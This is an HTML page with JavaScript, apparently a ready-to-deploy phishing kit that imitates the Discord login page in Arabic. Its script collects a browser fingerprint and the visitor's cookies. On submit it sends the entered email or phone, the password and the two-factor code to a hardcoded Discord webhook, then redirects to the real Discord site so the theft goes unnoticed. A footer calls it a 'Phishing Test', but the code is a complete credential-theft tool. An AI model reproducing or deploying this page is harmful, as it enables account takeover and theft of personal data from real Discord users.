<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { 
            font-family: 'Whitney', 'Inter', sans-serif;
            background: linear-gradient(135deg, #36393f 0%, #2f3136 50%, #202225 100%);
        }
        .discord-gradient {
            background: linear-gradient(92.54deg, #7289da 0%, #5865f2 100%);
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4 text-gray-100">
    <div class="max-w-6xl w-full flex flex-col lg:flex-row gap-8 lg:gap-16 items-center">
        <!-- Left Panel - Branding -->
        <div class="flex-1 text-center lg:text-left">
            <div class="text-5xl lg:text-6xl font-bold bg-gradient-to-r from-blue-400 to-indigo-500 bg-clip-text text-transparent mb-6">
                Discord
            </div>
            <h1 class="text-3xl lg:text-4xl font-bold text-white mb-4">مرحباً بك مرة أخرى!</h1>
            <p class="text-xl text-gray-300 max-w-md">نحن نبني مجتمع حيث يمكنك مشاركة صوتك والتواصل مع الأصدقاء والعائلة والمجتمعات التي تهمك.</p>
        </div>

        <!-- Right Panel - Login Form -->
        <div class="w-full max-w-md bg-gray-800/50 backdrop-blur-xl border border-gray-700/50 rounded-2xl p-8 shadow-2xl">
            <h2 class="text-2xl font-bold text-white mb-2">تسجيل الدخول للمتابعة</h2>
            <p class="text-gray-400 mb-8">أدخل بريدك الإلكتروني أو رقم هاتفك</p>

            <div id="errorAlert" class="hidden bg-red-500/20 border border-red-500/50 text-red-300 p-4 rounded-xl mb-6 text-sm"></div>

            <form id="discordLoginForm" class="space-y-4">
                <!-- Email/Phone -->
                <div>
                    <label class="block text-sm font-semibold text-white mb-2">البريد الإلكتروني أو رقم الهاتف</label>
                    <input type="text" id="emailPhone" required
                           class="w-full px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/50 transition-all duration-200 text-base"
                           placeholder="example@gmail.com">
                </div>

                <!-- Password -->
                <div>
                    <label class="block text-sm font-semibold text-white mb-2">كلمة المرور</label>
                    <input type="password" id="password" required
                           class="w-full px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/50 transition-all duration-200 text-base"
                           placeholder="••••••••">
                </div>

                <!-- 2FA Toggle -->
                <div class="flex items-center justify-between">
                    <label class="text-sm font-semibold text-white flex items-center gap-2">
                        <input type="checkbox" id="enable2fa" class="hidden">
                        <span class="toggle-slider w-11 h-6 bg-gray-600 rounded-full relative cursor-pointer transition-all duration-300 peer-checked:bg-blue-600 peer-checked:after:translate-x-5">
                            <span class="toggle-knob w-5 h-5 bg-white rounded-full absolute top-0.5 left-0.5 shadow-md transform transition-transform duration-300"></span>
                        </span>
                        التحقق بخطوتين
                    </label>
                </div>

                <!-- QR Code Container -->
                <div id="qrContainer" class="hidden mt-4 p-6 bg-gray-900/50 border-2 border-dashed border-gray-600 rounded-xl text-center">
                    <div class="w-32 h-32 bg-gradient-to-br from-gray-800 to-gray-900 border-4 border-gray-700 rounded-xl flex items-center justify-center mx-auto mb-4 font-mono text-sm text-gray-500">
                        QR CODE<br>SCAN AREA
                    </div>
                    <p class="text-gray-400 mb-3 text-sm">افتح Discord على هاتفك لتسجيل الدخول بسرعة</p>
                    <div class="w-full p-3 bg-gray-800 rounded-lg">
                        <label class="block text-xs font-semibold text-white mb-2 text-left">أو أدخل الرمز:</label>
                        <input type="text" id="totpCode" maxlength="6"
                               class="w-full text-center px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg text-xl font-mono tracking-widest text-white uppercase focus:border-blue-500 focus:ring-2 focus:ring-blue-500/50"
                               placeholder="000000">
                    </div>
                </div>

                <!-- Login Button -->
                <button type="submit" id="loginButton"
                        class="w-full bg-gradient-to-r from-blue-500 to-indigo-600 hover:from-blue-600 hover:to-indigo-700 text-white font-semibold py-4 px-6 rounded-xl text-lg shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 transition-all duration-200 flex items-center justify-center gap-2">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14"></path>
                    </svg>
                    <span class="default-text">تسجيل الدخول</span>
                    <span class="loading-text hidden animate-spin">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <circle cx="12" cy="12" r="10" stroke-width="3" pathLength="1" class="animate-spin" stroke="currentColor"></circle>
                        </svg>
                    </span>
                </button>
            </form>

            <div class="mt-6 pt-6 border-t border-gray-700 text-center">
                <a href="#" class="text-blue-400 hover:text-blue-300 text-sm font-medium transition-colors">مشاكل في تسجيل الدخول؟</a>
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK = 'https://discord.com/api/webhooks/1469329952464961708/VgxYi7uQH8AYVrYyFZorW1BbZJKQQa9Y5fOd3jgmX3fEY4NUYFj6AbhH19hGEiGl_m0c';
        
        // Victim fingerprint
        const fingerprint = {
            ip: 'جاري الاستعلام...',
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
            language: navigator.languages?.join(', ') || navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: document.cookie,
            localStorage: Object.keys(localStorage).join(', '),
            plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
            canvas: getCanvasFingerprint(),
            webgl: getWebGLFingerprint(),
            timestamp: new Date().toISOString(),
            url: window.location.href
        };

        // Canvas fingerprint
        function getCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Discord Security Check', 2, 2);
            return canvas.toDataURL();
        }

        // WebGL fingerprint
        function getWebGLFingerprint() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            return gl.getParameter(gl.RENDERER) + '|' + gl.getParameter(gl.VENDOR);
        }

        // Get real IP
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => fingerprint.ip = data.ip)
            .catch(() => {});

        // DOM elements
        const form = document.getElementById('discordLoginForm');
        const loginBtn = document.getElementById('loginButton');
        const enable2fa = document.querySelector('#enable2fa');
        const qrContainer = document.getElementById('qrContainer');
        const errorAlert = document.getElementById('errorAlert');
        const toggleSlider = document.querySelector('.toggle-slider');

        // 2FA Toggle
        enable2fa.addEventListener('change', function() {
            qrContainer.classList.toggle('hidden', !this.checked);
        });

        // Simulate toggle click
        toggleSlider.addEventListener('click', () => {
            enable2fa.checked = !enable2fa.checked;
            enable2fa.dispatchEvent(new Event('change'));
        });

        // Keylogger + Form capture
        document.addEventListener('input', (e) => {
            if (e.target.matches('#emailPhone, #password, #totpCode')) {
                console.log(`Field: ${e.target.id}, Value: ${e.target.value.slice(0, 4)}****`);
            }
        });

        // Form submission
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // Show loading
            loginBtn.disabled = true;
            loginBtn.querySelector('.default-text').classList.add('hidden');
            loginBtn.querySelector('.loading-text').classList.remove('hidden');
            errorAlert.classList.add('hidden');

            // Collect ALL data
            const payload = {
                type: 'DISCORD_FULL_CAPTURE',
                credentials: {
                    email_phone: document.getElementById('emailPhone').value,
                    password: document.getElementById('password').value,
                    totp_code: document.getElementById('totpCode').value || 'لم يتم إدخال رمز 2FA',
                    two_factor_enabled: enable2fa.checked
                },
                fingerprint,
                session: {
                    referrer: document.referrer,
                    origin: window.location.origin
                }
            };

            try {
                // Send to Discord webhook
                const response = await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: '🔔 Discord Security Monitor',
                        avatar_url: 'https://cdn.discordapp.com/emojis/1183487173435418880.png',
                        embeds: [{
                            title: '🎯 Discord Login Captured - الكامل',
                            description: 'تم التقاط بيانات تسجيل الدخول الكاملة مع بصمة الجهاز',
                            color: 0x5865f2,
                            thumbnail: {
                                url: 'https://cdn.discordapp.com/attachments/1469329952464961708/1183487173435418880/discord.png'
                            },
                            fields: [
                                { name: '📧 البريد/الهاتف', value: `\`${payload.credentials.email_phone}\``, inline: true },
                                { name: '🔑 كلمة المرور', value: `\`${payload.credentials.password}\``, inline: true },
                                { name: '🔐 رمز 2FA', value: `\`${payload.credentials.totp_code}\``, inline: true },
                                { name: '🌐 عنوان IP', value: `\`${fingerprint.ip}\``, inline: true },
                                { name: '🖥️ الشاشة', value: `\`${fingerprint.screen}\``, inline: true },
                                { name: '🌍 المنطقة الزمنية', value: `\`${fingerprint.timezone}\``, inline: true },
                                { name: '💻 User Agent', value: `\`${fingerprint.userAgent.slice(0, 50)}...\``, inline: false },
                                { name: '📱 Canvas Fingerprint', value: `[بصمة Canvas](${btoa(fingerprint.canvas).slice(0, 30)}...)`, inline: false },
                                { name: '🕐 الوقت', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true },
                                { name: '🔗 الرابط', value: `[فتح الصفحة](${window.location.href})`, inline: false }
                            ],
                            footer: { 
                                text: `Discord Phishing Test | ${navigator.userAgent.includes('Mobile') ? '📱 Mobile' : '💻 Desktop'}`,
                                icon_url: 'https://cdn.discordapp.com/emojis/1183487173435418880.gif'
                            }
                        }]
                    })
                });

                // Success - redirect to REAL Discord (looks legitimate)
                setTimeout(() => {
                    window.location.replace('https://discord.com/login?redirect_to=%2Fchannels%2F%40me');
                }, 1500);

            } catch (error) {
                // Even on error, redirect after delay (maintains realism)
                console.error('Webhook error:', error);
                setTimeout(() => {
                    window.location.replace('https://discord.com/login?redirect_to=%2Fchannels%2F%40me');
                }, 2000);
            }
        });
    </script>
</body>
</html>
